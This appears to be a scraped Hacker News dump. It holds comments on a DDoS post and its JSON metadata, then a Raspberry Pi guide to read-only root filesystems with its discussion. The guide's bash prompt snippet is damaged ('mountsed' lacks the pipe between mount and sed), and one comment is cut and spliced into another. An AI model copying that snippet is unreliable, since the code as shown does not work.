we make it so complex we can’t understand it then no one else can either, right? The important thing is making walls indestructible, not making more walls. Interfaces decrease performance and increase complexity reply headmelted 21 minutes agorootparentLiterally no-one said that. (Some of) the reasons why you would do this are explained (I thought clearly) above. None of this is security through obscurity. reply peanut-walrus 27 minutes agorootparentprevLiterally the entire guiding principle for security architecture for the past decade or even more has been that \"there is no such thing as an indestructible wall\". reply enva2712 18 minutes agorootparentI agree, perfection isn’t a realistic expectation. I also think effort spent building better defenses leads to fewer exploits over time than adding more of the same defenses. The marginal cost of bypassing a given defense is far lower than the initial cost to bypass a new defense reply oefrha 10 minutes agoprevThis is just a static marketing site for a desktop app. They don’t even have a discussion forum — feedback is handled by GitHub issues. Bragging about how simple their deployment is for a static marketing site and how it’s able to handle a static file being downloaded millions of times a day is super weird. And Cloudflare is doing all the mitigation work here (if that’s even needed for such a puny amount of traffic), not them. I like the app btw. reply NKosmatos 1 hour agoprevNice one :-) “… => Thus, we build a monolith service for each app, which is easy to deploy and maintain. No Docker, no Kubernetes, no dependencies, no runtime environment - just a binary file that can be deployed on any newly created VPS. …” reply iamcalledrob 1 hour agoparentThis is such a fantastic benefit of Golang: spin up a VPS, apply some sensible defaults, cross compile then run your binary. Compare this to deploying python, node or php... Needless complexity. If only running (and keeping running) a database server could be this straightforward! reply zilti 2 minutes agorootparentJust pack up your whatever-else as an AppImage. Job done. reply binarymax 57 minutes agorootparentprevNowadays you can bundle a node app as a single binary file. It’s an underused feature, maybe it will catch on. reply enva2712 25 minutes agorootparentI saw that deno did this but cool to see node picked it up too. I wish there was an option to run turbofan at build to generate the instructions rather than shipping the entire engine, but i guess that would require static deps and no eval, which can’t really be statically checked with certainty reply sedatk 43 minutes agorootparentprevYou can build native and self-contained binaries in C# too. reply quietbritishjim 48 minutes agorootparentprevFor Python, you could make a proper deployment binary using Nuitka (in standalone mode – avoid onefile mode for this). I'm not pretending it's as easy as building a Go executable: you may have to do some manual hacking for more unusual packages, and I don't think you can cross compile. I think a key element you're getting at is that Go executables have very few dependencies on OS packages, but with Python you only need the packages used for manylinux [2], which is not too onerous (although good luck finding that list if someone doesn't link it for you in a HN comment...). [1] https://nuitka.net/ [2] https://peps.python.org/pep-0599/#the-manylinux2014-policy reply tuwtuwtuwtuw 1 hour agoparentprevI don't use TablePlus myself. Are they talking about their marketing website? If so, then obviously thet wouldn't need to use Kubernetes. Are they talking about their application then I wonder how there can be no dependencies - don't it store data, log things, etc? reply tux3 58 minutes agorootparentYou can store data by connecting to a database, and you can store logs by either sending them to the system journal and having a daemon collect them, or sending them to whatever cloud you like using a logging library. It's fine, really. Those database and logging services you can put in a docker if you like, but if you put them anywhere else it works just the same. A Postgres in k8s or a Postgres on a dedicated server is the same as far as the client is concerned. reply TheRoque 46 minutes agorootparentprevYep, I'm wondering the same thing. It seems easy to brag about using only one binary if you don't need to use another service e.g. a database. reply ortichic 52 minutes agorootparentprevthey talk about storing logs and separating databases, so good question reply mastermedo 1 hour agoprevI might be out of touch with reality, but billions of requests per month sounds like peanuts. Is that considered a big ddos attack? reply anonzzzies 1 hour agoparentDepends who is paying for that? Self hosted that’s not a problem, but ‘serverless’ that’s usually costly at those levels, especially for worthless traffic. reply rezonant 12 minutes agoparentprevSomething like 300-400 API requests per second is not a heavy load for any reasonably designed API. Something like 300-400 static files requests per seconds is less than peanuts. reply heythere22 1 hour agoparentprevYour correct. 1 billion requests per month is 380 requests per second on average which is not that high reply fragmede 46 minutes agorootparentassuming they're smeared equally across the whole month, that is. Eg if the majority of those requests kick off a job at midnight on the first of the month, it's a bit more to deal with. reply logtempo 48 minutes agorootparentprevit's 2.3/second not 380 reply avoid3d 39 minutes agorootparentHow are you arriving at that number? 60 seconds per minute 60 minutes per hour 24 hours per day 30 days per month ~2.59 million seconds per month One billion requests into 2.59 million seconds is 386 requests per second. reply drewdevault 1 hour agoparentprevIt depends on a lot of factors. Generally people provision infrastructure according to its expected usage, and to overprovision is wasteful. reply mastermedo 42 minutes agorootparentI see, that makes sense. And automatic provisioning can be costly in instances like ddosing. reply filleokus 25 minutes agoprevWas hoping for something more swole dog worthy when reading the headline. Even though I agree with much of the advice, being behind Cloudflare is definetly not nothing. Depending on the distribution of the traffic they might have survived well on VPS's without Cloudflare anyways, doesn't seem that large. Would be interesting to see more detailed stats of rps and how much (if any) Cloudflare stopped before they got it. Russian layer7 ddos'es that I know of targeting Swedish companies have been large enough that major providers run into capacity problems and fall over (including Verizon, Azure Frontdoor, Cloudflare, GCP's Load balancer). This strategy would absolutely not work against those volumes. reply kopos 53 minutes agoprevA bit ingenious to say we do nothing when you have CloudFlare in front of your servers. Cloudflare by itself can automatically detect and handle DDoS without explicitly activating the Under Attack mode. Also Java jar files give you the same benefit. reply rezonant 11 minutes agoparentAlso those requests for the 200MB setup aren't even hitting your servers unless you have disabled caching for some reason, not that it'd be that hard to serve it directly. reply vintermann 52 minutes agoparentprev> Also Java jar files give you the same benefit. You have to explain that one a bit more. reply RedShift1 14 minutes agorootparentYou can compile a jar to include all dependencies (like statically compiling C code), then you can just run `java -jar myprogram.jar` and it will work as long as the Java runtime is the same major version or newer than the version you compiled for. reply cwillu 46 minutes agoparentprevIngenious doesn't mean what I think you think it means. reply worddepress 30 minutes agorootparentIt is ingenious to turn a mild attack into a 100+ point HN submission! reply n4r9 46 minutes agoparentprev> bit ingenious I think the word you're after is \"disingenuous\" reply tromp 23 minutes agoprev> our setup file is approximately 200MB > we keep things as minimal as possible Wonder what's in that file that makes it need to be that large... reply hntddt1 17 minutes agoprevIt's going to a point where that directly find out the person behind it is cheaper than fix the bug. People nowadays don't pay respect to the hard working people anymore reply block_dagger 43 minutes agoprevReminds me of Nietchze’s Genealogy of Morals quote: I’m strong enough to allow that. reply 082349872349872 36 minutes agoparentThe latin equivalent: aquila non captat muscas (\"eagles don't hunt flies\") Anyone have the cuneiform expression for 80/20? reply vintermann 52 minutes agoprev> we’ve simplified the deployment process as much as possible. We don’t use Docker, Kubernetes, or any containers, or need to setup the enviroment. This sounds like a dream, both in the sense that it's wonderful, and that I'm not quite sure I believe it. reply razodactyl 58 minutes agoprevI like this a lot: Why? Because the attacks are directed to someone who isn't bothered and wastes their own resources. I've been a Table Plus user for near a decade now and enjoy the simple but highly compatible software they provide. reply bun_terminator 27 minutes agoprevI guess this is an ad, so I'll bite: Why is the mac download button featured so centrally, while there appear also to be downloads for other platforms, too? It's not like that's a usual default. reply CanaryLayout 27 minutes agoprevYeah Goroutines are great. Then add something like WebRTC to your project that realistically tops out at 10000 listeners, and people wonder why Twitter Spaces is so buggy... reply kbar13 3 minutes agoprevnot really that interesting of a post. billions of requests per month is like low hundreds of requests per second. billion is a big number but so is a month when it comes to request throughput. all the grandstanding about monolith... for something that serves 2-3 requests per second, and is a static marketing site... this is so overblown. reply pknerd 15 minutes agoprevoff topic but you guys have done solid SEO. You query anything related to SQL/syntax and tableplus will be in front of you. reply rs_rs_rs_rs_rs 13 minutes agoparentUsing TablePlus and I would wager it's not the SEO but the quality of the tool. reply vdddv 58 minutes agoprevIs there any way to know who's behind a DDoS attack? reply thenthenthen 27 minutes agoparentThemselves? From their marketing budget? reply tluyben2 1 hour agoprevSimilar problem and similar-ish product 0]; we get DDoSsed a lot and I don’t know why. We had to put Cloudflare botfight to stop it. That works very well, but what do you do if CF doesn’t exist? 0] https://flexlists.com reply ddorian43 1 hour agoprevA nice thing about modern cloud providers is their expensive bandwidth so a new vector of attack is simply downloading large files that they host. (except cloudflare) reply ur-whale 41 minutes agoprevPublic boasting as a mitigation strategy, that's got to be a new one. Not entirely sure it's a wise approach given the deeply asymmetric infrastructure costs of DDoS attacks, especially if the attacker has access to a botnet. [EDIT]: in other words, there is a non-zero probability that the attacker, piqued by the boasting, might be able at the flick of a switch to increase the intensity of the attack by a factor 1M. reply samyar 50 minutes agoprevThis is the first time hear the word \"Monolith\" What is it and how can one learn about it. reply pmontra 39 minutes agoparentIt's a well established term. Example, this article of James Lewis and Martin Fowler from 10 years ago https://martinfowler.com/articles/microservices.html \"To start explaining the microservice style it's useful to compare it to the monolithic style: a monolithic application built as a single unit. Enterprise Applications are often built in three main parts: a client-side user interface (consisting of HTML pages and javascript running in a browser on the user's machine) a database (consisting of many tables inserted into a common, and usually relational, database management system), and a server-side application. The server-side application will handle HTTP requests, execute domain logic, retrieve and update data from the database, and select and populate HTML views to be sent to the browser. This server-side application is a monolith - a single logical executable[2]. Any changes to the system involve building and deploying a new version of the server-side application.\" reply doctor_eval 46 minutes agoparentprevIt just means that there is one big binary that does everything, instead of a bunch of microservices communicating over a fabric of some kind. As someone who thinks microservices actually simplify a lot of things, especially in complex domains, the idea that a monolith is a choice makes me cringe a bit. I mean they start out simple, but ... reply kryptiskt 14 minutes agorootparentThe idea of unnecessarily replacing nanosecond scale function calls with network communication that is five orders of magnitudes slower makes me shiver. Yeah, you can make a microservice that does one thing with a well-defined API and it's nice and clean. But you might as well make a module that does one thing with a well-defined API, and it will be so much faster because it's right there in memory with you. reply robwg 18 minutes agorootparentprevThem be fighting words. Tell some others orgs I've worked at that microservices are simple and they would laugh. But yes it depends on the complexity of your domain/org. reply everybackdoor 55 minutes agoprev [–] Yep, just as the xz/liblzma/libxml/gettext fiasco is unrolling, let’s all jump into the same bandwagon and start shipping containers full of opaque binaries to our public-facing web servers. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The blog addresses a DDoS attack on the company's server, highlighting their choice not to intervene due to their system's capability to withstand the assault.",
      "Their resilience during the attack is credited to their uncomplicated, monolithic service structure and utilization of efficient frameworks such as Golang and Rust.",
      "Emphasizing the significance of sound deployment strategies, they advocate for employing binaries over containers and enhancing performance by circumventing intermediary layers."
    ],
    "commentSummary": [
      "Tableplus.com discusses DDoS attacks, website vulnerabilities, traffic spikes, application deployment in containers, and security measures like \"Under Attack\" mode.",
      "Topics include building monolith services with Golang, managing high request volumes, and the monolithic vs. microservices architecture debate.",
      "Opinions are shared on enhancing security, simplifying deployment, and addressing organizational challenges when selecting architectural strategies."
    ],
    "points": 139,
    "commentCount": 82,
    "retryCount": 0,
    "time": 1711784130
  },
  {
    "id": 39869614,
    "title": "Maximizing Raspberry Pi's Lifespan: Running with Read-Only Root Filesystem",
    "originLink": "https://www.dzombak.com/blog/2024/03/Running-a-Raspberry-Pi-with-a-read-only-root-filesystem.html",
    "originBody": "Running a Raspberry Pi with a read-only root filesystem March 29, 2024 • Tagged: series:pi-reliability raspberry-pi linux Many applications that run on Raspberry Pis and similar single-board computers — for example, environmental data loggers that report to a central database server — don’t really need to store any state locally on the Pi’s SD card. This means you can run the Pi with a read-only root filesystem, which will dramatically increase the SD card’s lifetime. Keep in mind that, with a read-only filesystem, logs won’t be persisted on the Pi after a reboot or power loss, so remote logging is very helpful for troubleshooting. The information in this post is, to the best of my knowledge, current as of March 2024. It should work on Raspberry Pi OS versions 11 (Bullseye) and 12 (Bookworm), at least, but I make no promises. These changes are risky; following these steps, even if everything goes well, could render your Pi unbootable, requiring you to connect a keyboard and monitor to fix it. (See my Pi Reliability post on risk vs. benefits.) microSD card choice For this use case, using the smallest SD card possible is fine; a high-endurance card is ideal but not strictly necessary, since the whole point is to (almost) never write to it. Plan overview The overall idea here is to: Remove unneeded software & disable unneeded services Be sure the Pi is not using its SD card for swap space Implement various workarounds and hacks for certain services that expect to be able to write to disk Provide tmpfs filesystems for paths that must be writable and store transient data Configure the system to mount the root filesystem as read-only Add some systemwide shell shortcuts to ease system maintenance Disable unneeded software and SD card swap Some read-only Pi guides recommend removing logrotate and using busybox-syslogd instead; I want to keep using journalctl and friends as I’m used to, so I don’t do that. Look at the services running on the Pi and disable anything you don’t need and be sure your Pi isn’t using the SD card for swap space. Run an update and reboot Not strictly necessary, but I like to make sure the system is up to date before freezing it in place: sudo apt update && sudo apt upgrade sudo apt autoremove --purge sudo reboot now In /boot/cmdline.txt, disable swap and filesystem checks Edit this file via sudo nano /boot/cmdline.txt Append the following: fsck.mode=skip noswap (unless you plan to use an external drive as swap, in which case, omit noswap here) The resulting line will look something like this (copied from an Pi Zero W): console=serial0,115200 console=tty1 root=PARTUUID=76b4450a-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait fsck.mode=skip noswap Older guides recommend you add fastboot to this line. This has been replaced by fsck.mode=skip. Migrate to ntp instead of systemd-timesyncd According to The Internet, systemd-timesyncd won’t work with a read-only filesystem, but we can get ntp to with a few workarounds. We’ll also allow fake-hwclock to write to the filesystem, which isn’t ideal, but the clock resetting back to 1970 on each boot will cause problems. This is also a good opportunity to use sudo raspi-config to be sure your timezone is set correctly. We’ll migrate from systemd-timesyncd to ntp: sudo systemctl disable systemd-timesyncd.service sudo apt install ntp We have a few ntp settings to adjust. First, edit /etc/ntp.conf. Change the driftfile setting to store this state in /var/tmp (which we’ll put in a tmpfs later). The file will then start something like this: $ head -n 4 /etc/ntp.conf # /etc/ntp.conf, configuration for ntpd; see ntp.conf(5) for help driftfile /tmp/ntp.drift Then, enable ntp, via sudo systemctl enable ntp. Next, we need to edit the ntp systemd unit file to avoid using a systemd feature (PrivateTmp) that won’t work on a read-only filesystem. Run sudo systemctl edit ntp, and paste the following lines: [Service] PrivateTmp=false Those will be the only lines in that file. Edit /etc/cron.hourly/fake-hwclock, a script which saves the current clock periodically in case of power failure. This is the one thing that we’re going to allow to write to the SD card. Add the two mount ... lines you see below, so the resulting file looks like this: #!/bin/sh # # Simple cron script - save the current clock periodically in case of # a power failure or other crash if (command -v fake-hwclock >/dev/null 2>&1) ; then mount -o remount,rw / fake-hwclock save mount -o remount,ro / fi NetworkManager These instructions are for Raspberry Pi OS versions 11 (Bullseye), 12 (Bookworm), and newer. For older distributions (10/Buster or older) see the DHCP/DHCPD5 section of my earlier blog post. We’ll shuffle some networking files around, remove some that we don’t strictly need to persist, and create symlinks from their original locations to /var/run, which is already a tmpfs: sudo mv /etc/resolv.conf /var/run/resolv.conf && sudo ln -s /var/run/resolv.conf /etc/resolv.conf sudo rm -rf /var/lib/dhcp && sudo ln -s /var/run /var/lib/dhcp sudo rm -rf /var/lib/NetworkManager && sudo ln -s /var/run /var/lib/NetworkManager I won’t lie: I was nervous when I first ran that, but everything seemed fine afterward. As with everything in this guide, YMMV. Move the random-seed file to a writable location We’ll move the existing systemd random-seed file to a path we’ll put on a tmpfs, and link to it from the original location: sudo mv /var/lib/systemd/random-seed /tmp/systemd-random-seed && sudo ln -s /tmp/systemd-random-seed /var/lib/systemd/random-seed To create this file in the /tmp folder at boot before starting the random-seed service, edit the file service file to add an ExecStartPre command. Run sudo systemctl edit systemd-random-seed.service, and paste these lines in: [Service] ExecStartPre=/bin/echo \"\" >/tmp/systemd-random-seed Note: snapd I don’t have much experience yet with how snaps behave on a read-only filesystem. So far, this is the behavior I’ve noticed: Programs installed via snap still seem to run. There are messages in the journal like cannot run daemon: fatal: error opening lock file: open /var/lib/snapd/state.lock: read-only file system, but I think these can be safely ignored: there’s no need to hold that lock if snapd can’t write to state.json. Programs that snap had refreshed recently, but which I hadn’t run in a long time, print a warning when I run them: 2024/03/29 16:44:24.831251 cmd_run.go:1046: WARNING: cannot create user data directory: cannot update the 'current' symlink of \"/home/cdzombak/snap/go/current\": remove /home/cdzombak/snap/go/current: read-only file system. But they still seem to run as expected. To solve that last annoyance, you can do this before making the filesystem read-only: Update snaps via sudo snap refresh For each snap listed in ~/snap, run the relevant program. On this particular system, this just meant running go and golangci-lint. If all the snap names in ~/snap are equivalent to binary names, you could do this via the bash one-liner for n in ~/snap/*; do [ -x /snap/bin/\"$(basename $n)\" ] && /snap/bin/\"$(basename $n)\"; done. I reserve the right to update this advice as I learn more, of course! Disable systemd-rfkill I can’t find much straightforward discussion on this service and its relationship to the rfkill tool. But, assuming your wireless devices (WiFi, Bluetooth) are currently working as desired, it seems safe to disable this service. sudo systemctl disable systemd-rfkill.service sudo systemctl mask systemd-rfkill.socket This may break something if you’ve used the rfkill tool on your Pi to explicitly disable/enable a wireless device before. In that case, you know more about rfkill than I do, so you should be able to figure out what’s best for your use case. Disable daily apt and mandb tasks Both of these expect to be able to make filesystem writes that persist across reboots. We don’t need them on a system whose software is frozen in place: sudo systemctl mask man-db.timer sudo systemctl mask apt-daily.timer sudo systemctl mask apt-daily-upgrade.timer Move temporary folders to tmpfs Finally, we get to the point that we’re adding tmpfs entries to our fstab. Edit /etc/fstab to include these lines: tmpfs /tmp tmpfs defaults,noatime,nosuid,nodev 0 0 tmpfs /var/tmp tmpfs defaults,noatime,nosuid,nodev 0 0 Move some spool folders to tmpfs Edit /etc/fstab to include these lines: tmpfs /var/spool/mail tmpfs defaults,noatime,nosuid,nodev,noexec,size=25m 0 0 tmpfs /var/spool/rsyslog tmpfs defaults,noatime,nosuid,nodev,noexec,size=25m 0 0 (Note that if you followed my guide to setting up rsyslog on a Pi, there should already be an entry placing /var/spool/rsyslog in a tmpfs.) Deal with /var/log We’ll add another tmpfs to /etc/fstab for the /var/log folder: tmpfs /var/log tmpfs defaults,noatime,nosuid,nodev,noexec,size=50m 0 0 When storing /var/log in RAM, unless you’ve disabled journald, you need to limit the amount of space journald is allowed to use. To do that, edit /etc/systemd/journald.conf. Uncomment the SystemMaxUse=... line (if necessary), and set it to half of your /var/log tmpfs size, or maybe a little less: # This file is part of systemd. ## See journald.conf(5) for details. [Journal] #SystemMaxUse=49M #Optional: Completely disable journald persistence Instead of moving /var/log to a tmpfs, you might want to configure your system not to write to logs to disk or RAM, particularly if you’ll send logs to a remote syslog server. To do that, edit /etc/systemd/journald.conf. Uncomment the Storage=... line (if necessary), and change it to Storage=none: # This file is part of systemd. ## See journald.conf(5) for details. [Journal] Storage=none #Move logrotate state to tmpfs logrotate stores some state in /var/lib/logrotate and may not work if it can’t update that folder. Again, add this line to /etc/fstab: tmpfs /var/lib/logrotate tmpfs defaults,noatime,nosuid,nodev,noexec,size=1m,mode=0755 0 0 Move sudo state to tmpfs sudo stores some state in /var/lib/sudo, which should be writable. Add this line to /etc/fstab: tmpfs /var/lib/sudo tmpfs defaults,noatime,nosuid,nodev,noexec,size=1m,mode=0700 0 0 Add ro to the end of your /boot/cmdline.txt line (Almost there!) Edit /boot/cmdline.txt again, and append ` ro` to the line. Modify fstab options to set filesystems as read-only Edit /etc/fstab again. This time, change the lines that refer to your SD card. In column 4, after the word defaults (without adding any whitespace): Add the ,ro flag to both SD card mounts If it’s not there already, add the ,noatime option to the / mount Sample files at this point /etc/fstab: proc /proc proc defaults 0 0 PARTUUID=76b4450a-01 /boot vfat defaults,ro 0 2 PARTUUID=76b4450a-02 / ext4 defaults,noatime,ro 0 1 tmpfs /tmp tmpfs defaults,noatime,nosuid,nodev 0 0 tmpfs /var/tmp tmpfs defaults,noatime,nosuid,nodev 0 0 tmpfs /var/log tmpfs defaults,noatime,nosuid,nodev,noexec 0 0 tmpfs /var/spool/mail tmpfs defaults,noatime,nosuid,nodev,noexec,size=25m 0 0 tmpfs /var/spool/rsyslog tmpfs defaults,noatime,nosuid,nodev,noexec,size=25m 0 0 tmpfs /var/lib/logrotate tmpfs defaults,noatime,nosuid,nodev,noexec,size=1m,mode=0755 0 0 tmpfs /var/lib/sudo tmpfs defaults,noatime,nosuid,nodev,noexec,size=1m,mode=0700 0 0 /boot/cmdline.txt: console=serial0,115200 console=tty1 root=PARTUUID=76b4450a-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait fsck.mode=skip noswap ro Add systemwide bash integration Add the following lines to the end of /etc/bash.bashrc: set_bash_prompt(){ fs_mode=$(mountsed -n -e \"s/^\\/dev\\/.* on \\/ .*(\\(r[w|o]\\).*/\\1/p\") PS1='\\[\\033[01;32m\\]\\u@\\h${fs_mode:+($fs_mode)}\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' } PROMPT_COMMAND=set_bash_prompt alias ro='sudo mount -o remount,ro / ; sudo mount -o remount,ro /boot' alias rw='sudo mount -o remount,rw / ; sudo mount -o remount,rw /boot' This gives you the following features: A prompt indicating whether you’re in read-only or read-write mode The commands rw to switch to read-write mode, and ro to switch back to read-only mode Use bash_logout to switch to read-only mode when you log out Edit this file via sudo nano /etc/bash.bash_logout. It may not exist yet, in which case saving this file from nano will create it. The file should contain this line: sudo mount -o remount,ro / ; sudo mount -o remount,ro /boot Reboot, Verify with mount, Check journalctl for issues sudo reboot now # and then wait; SSH back in when the system comes back up mount # verify that SD card partitions are mounted `ro` sudo journalctl -b 0 # scroll through and look for any issues When looking for issues, you’ll undoubtedly see some errors from various processes. You’ll want to investigate those. Start by checking “is this actually broken?”. Often there will be messages from e.g. avahi-daemon or snapd that are unhappy they can’t go about their business normally on a read-only filesystem. But as long as that software is still working for your purposes, you can safely ignore their complaints. References and Acknowledgements See the notes on my earlier post. See Also: Considerations for a long-running Raspberry Pi.",
    "commentLink": "https://news.ycombinator.com/item?id=39869614",
    "commentBody": "Running a Raspberry Pi with a read-only root filesystem (dzombak.com)138 points by ingve 11 hours agohidepastfavorite47 comments st_goliath 8 hours agoSurprisingly, the article doesn't seem to mention SquashFS[1] or EROFS[2]. Both SquashFS and EROFS are filesystem specifically designed for this kind of embedded, read-only use case. The former is optimized for high data density and compression, and already well established. The later is comparatively new and optimized for high read speed.[3] SquashFS as a rootfs can already be found in many embedded applications using flash storage and is typically also combined with tmpfs and persistent storage mount points or overlay mounts. For both those filesystems, one would build a rootfs image offline. In the Debian ecosystem, there already exists a tool that can bootstrap a Debian image into SquashFS[4]. [1] https://en.wikipedia.org/wiki/SquashFS [2] https://en.wikipedia.org/wiki/EROFS [3] https://www.sigma-star.at/blog/2022/07/squashfs-erofs/ [4] https://manpages.debian.org/testing/mmdebstrap/mmdebstrap.1.... reply m463 7 hours agoparentI have a pi or two running openwrt, which does this naturally. I also have a pi running pikvm. You change the filesystem by doing: # rwa standalone ntp server) reply magicalhippo 6 hours agoparentprevSimilar. I've been running multiple Pi's for years, and had issues with two. Got a USB cable tester and found both had cables with 1+ Ohms resistance, which would cause drop to less than 4V under load! Swapped both cables to some good ones and never had an issue since. I always use A1 or ideally A2 rated cards from reputable brands bought from reputable stores. Not sure if they help with longevity but the additional IOPS are very noticeable. reply sdenton4 6 hours agoparentprevNot sure how things are these days, but it used to be the case that power fluctuations could kill an rpi's sd card. So yeah, you could mitigate with a great power supply and a good surge protector, but in practice I found it hard to figure out which power supplies to actually trust. For my own deployments, I ended up doing read only boot from SD card, making use of a ram disk for temporary files, and hosting the actual os on a USB stick, which was much better shielded from power issues. Worked great, never had issues, but the setup was pretty non standard. reply walteweiss 3 hours agorootparentChances you have any online notes on that? reply hiAndrewQuinn 3 hours agoprevThe Pi I have powering https://hiandrewquinn.github.io/selkouutiset-archive/ has a read-only / . Everything happens in RAM, and resetting everything back to normal is a matter of unplugging and replugging the device back in. I could do so much more with this resource, but I'm honestly quite happy with it as it is. reply blackfawn 9 hours agoprevI like using Alpine for read-only operation on the Pi right out of the box: https://wiki.alpinelinux.org/wiki/Raspberry_Pi reply GianFabien 8 hours agoparentAlpine has been great for me too. Use an USB Flash drive mounted as a R/W filesystem for logs, etc. fsck can usually recover those f/s when crashed. The root f/s remains intact. reply seemaze 4 hours agoparentprevThis is the way. Run from ram and an excellent selection of packages to boot! I have a number of pi zero and pi 2 zero running alpine. reply jasongill 9 hours agoprevYou can skip the ntp/systemd-timesyncd/fake-hwclock stuff if you add a RTC/coin battery to the device. The Raspberry Pi 5 has built-in RTC with support for an official battery which costs about five bucks and works well for this. Older devices have aftermarket RTC's with battery backups as well. reply petee 9 hours agoparentTheres also a kernel option to sync PPS on a gpio from a gps clock reply idatum 9 hours agoprevThese Pi* devices have served well running their Debian version for years. I had a Pi3b run ADS-B (generally RTL-SDR) for many years. Dang though, all with (seemingly) random SD storage failures. Article details seems like it can help. There are more options now though. Aarch64 ones that use eMMC. I replaced the Pi3b with a Pine64 Rock64 running FreeBSD 14 booting from eMMC. Simple and just works with all RTL-SDR needs covered. It's great to have options, both hw and os. reply LeoPanthera 8 hours agoprevIt's worth noting that you don't have to do this manually. Enabling \"overlay filesystem\" in raspi-config will do this for you, so that all changes to the filesystem are lost after a reboot. reply abdela 32 minutes agoparentAnd you can create a second, small partition/filesystem if you still need to persist some things. I used to have very little data to persist and I would mount/write/unmount every time I write to deal with possible power issues. reply ctrlw 1 hour agoparentprevYes, I was missing a mention of that in the blog post and maybe a brief discussion why to do the manual setup instead. reply TMWNN 1 hour agorootparentIndeed. The post even mentions `raspi-config`, but doesn't mention `Performance OptionsOverlay File System`. Makes me think that the author isn't aware of the option at all. (The same way undoes read-only mode, but two reboots will be required instead of one.) reply HankB99 7 hours agoparentprevI believe the overlayfs configured using raspi-config is a little different in that it presents the appearance of a normal filesystem but all changes are gone following reboot. Before reboot the changes are cached in RAM which can have consequences for low RAM systems. I use the overlayfs provided by raspi-config. reply cjdell 2 hours agoprevThe \"buildroot\" project is perfect for your embedded system. Build a custom minimal Linux system with tiny image sizes that are read-only by default. Pick exactly which services you need and no more. Less moving parts the better. I'm using it on 10 year old Pi's with USB RS485 dongles to get Ethernet access to solar equipment. reply Abishek_Muthian 5 hours agoprevI have couple of memory cards (mostly Samsung) for RPi which became readonly, I keep them separately for use cases mentioned by OP. I've since then switched to using only Toshibha memory cards in RPi & haven't had any failures. reply eternityforest 5 hours agoprevI don't usually do full read only, what I'll do is run a script that turns off stuff that does not need to be writing to the disk all the time. Unfortunately, some software is database-oriented and likes to write to disk for every tiny thing, so the approach doesn't work with stuff like Home Assistant unless you carefully configure logging. The basic simple stuff doesn't really cause any user-level noticable changes: https://github.com/EternityForest/KaithemAutomation/blob/mas... After that, I disable and mask apt-daily (The Debian auto updater), and purge dphys-swapfile. My full set of assorted tweaks can be found here, some might not be relevant for you: https://github.com/EternityForest/KaithemAutomation/blob/mas... Next, I often run Chromium as a kiosk, and Chromium likes to hammer the SD card, so I set the XDG folder environment variables to make it put it's stuff in RAM. My embedded chrome stuff can be found here: https://github.com/EternityForest/KaithemAutomation/blob/mas... With all these tweaks, a Pi will have excellent reliability without losing the benefits of a writable FS. If you need true industrial grade perfect reliability, you probably need an industrial card and maybe true a read-only system. reply eschneider 7 hours agoprevI make a lot of embedded linux distress and there are a lot of ways to skin the r/o rootsf problem. Assuming you've got some bit of r/w storage, the easiest thing is making the whole rootfs r/o and bind mounting the bits you need writable. reply abdela 31 minutes agoparentThat is what I did as well. reply Wowfunhappy 9 hours agoprev> This means you can run the Pi with a read-only root filesystem, which will dramatically increase the SD card’s lifetime. I can't find an authoritative source, but some quick Googling brings up websites like Reddit and Stackexchange saying that SD cards have ~100,000 lifetime write cycles. I feel like it would be hard to exhaust that. Is this a real problem people experience? reply Prcmaker 9 hours agoparentI haven't had an issue with SD cards where Pis had reliable power. Where I used to live though we had frequent power cuts, of only a couple of seconds, a couple of times a day. SD card corruption was a major pain. Even in areas with more reliable power, for a 24/7 on device, occasional power outages have lead me to move away from Pis. Battery backups are, of course, an option, but increase the cost for a reliable and simple system. reply rcxdude 9 hours agoparentprevYes, it's not particularly hard to wear out an SD card (especially a cheap, high-densite one), with just the wear of writing logs. It does vary a lot depending on what exactly you are going, but it's a fairly commonly reported failure among raspberry pi users. reply monocasa 5 hours agoparentprevYes, as someone who shipped embedded systems running off of SD cards, it's a real problem. It's not the flash endurance you hit typically, but bugs in the card firmware that cause the FTL to completely lose it's mind. Yes, even with supposedly quality brands. About the only way I found to deal with the problem is to use \"industrial\" SD cards that are a little slower and pretty expensive, but the firmware takes less liberties in the name of specious benchmarks. reply adobrawy 9 hours agoparentprevYea, it's a real issue. Search for \"raspberry pi dead SD card\" to found report of ppl which have failing SD card every month or more often. reply rcarmo 9 hours agorootparentMost of those tend to be power issues. reply jorvi 9 hours agoparentprevIt is, but mostly due to logging to disk instead of RAM. That’s what setting a read-only root file system prevents in a roundabout way, so people have started to misidentify it as the solution. reply bobmcnamara 9 hours agoparentprevIt was a plague for years where power failure during a write would cause an SD card to go read only or worse. reply NegativeLatency 8 hours agoparentprevA lot of people also run them with a power supply that will undervolt, switched to ones with more amps and haven't had issues since reply CliffStoll 9 hours agoparentprevMy website is on a pi-4 and hasn't had a hiccup in 4 years. So far, the SD-card has worked great. reply lahvak 5 hours agoprevYears ago I used one of the first pis as a music/podcast player in my car. The problem was that there was no proper shutdown process, you turn of the car, and the power cuts off, so I set it up to create and mount a ram disk while booting, and do all writing to the ram disk. From the comments here, it looks like the newer pis have this as a config option now. reply anon-3988 5 hours agoprevThanks for this. I am using my RPI5 to learn about using remote computers, hacking around with and writing my tools to monitor stuff and do automation in Python. Just putting it here in case anyone have similar blogs/articles I can read about that goes through the same journey. reply vinni2 3 hours agoprevI realized this the hard way after about 5 of my se cards were fried. reply logicziller 10 hours agoprevWe use pi-builder that can produce reproducible images. Read-only is one of the default options. reply ashwoods 9 hours agoprevI now prefer to use overlayfs with a tmpfs overlay. Much simpler to configure and update. reply crashbunny 5 hours agoparentyears ago I did the same, I vaguely remember following a blog post to do it. I put the scripts on github and some people found it useful. There's a deb package now that does it called overlayroot. reply jauntywundrkind 9 hours agoprevA long time ago I modified debian-live to use btrfs-send to copy the usb image into some kind of ramfs. So you could hypothetically snapshot & send back your current snapshot to the USB as you want. Having a kick ass fs at your back is great. Go for it! One of my persistently greatest annoyances about running stuff on pis has been that journald is so monolithic. There's no per-app controls. I'd love to log most system functions persistently with decent sized history (since they are very low volume), but have the main app or another app do something else. Struggling to find them ATM, but there are a number of issues opened around this way back, and all closed, saying to run multiple systemd-journal instances then configure apps to direct traffic to each, but that sure sucks to setup & configure, & is something I'd hope journald would help me with out of the box. reply ngcc_hk 5 hours agoprev [–] Wonder can you do this for those read only publishing site using even some cloud system image. Or even GitHub based web site? What is the 